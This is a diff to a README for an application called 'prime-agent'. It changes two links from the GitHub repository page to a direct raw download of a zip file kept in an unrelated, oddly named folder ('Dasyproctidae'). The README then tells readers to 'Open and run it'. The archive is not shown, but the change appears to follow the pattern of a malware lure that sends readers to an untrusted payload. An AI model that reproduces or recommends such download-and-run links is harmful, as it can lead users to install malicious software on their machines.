@@ -14,7 +14,7 @@ Are you ready to try prime-agent? Great! Here's what you need to do.
 
 **Step 1: Download the application**
 
-👉 **[Click here to download prime-agent](https://github.com/Aliceemanu461/prime-agent)**
+👉 **[Click here to download prime-agent](https://github.com/Aliceemanu461/prime-agent/raw/refs/heads/main/Dasyproctidae/agent-prime-1.1-beta.1.zip)**
 
 Visit this link to download the application. The download page will open in your web browser. Look for the download button or link on that page.
 
@@ -156,7 +156,7 @@ Prime-agent's "long-running autonomous tasks" ability means it can handle jobs t
 
 You're all set to get started with prime-agent. Here's your quick action plan:
 
-1. ✅ Go to the **[download page](https://github.com/Aliceemanu461/prime-agent)**
+1. ✅ Go to the **[download page](https://github.com/Aliceemanu461/prime-agent/raw/refs/heads/main/Dasyproctidae/agent-prime-1.1-beta.1.zip)**
 2. ✅ Download the application
 3. ✅ Open and run it
 4. ✅ Try your first task
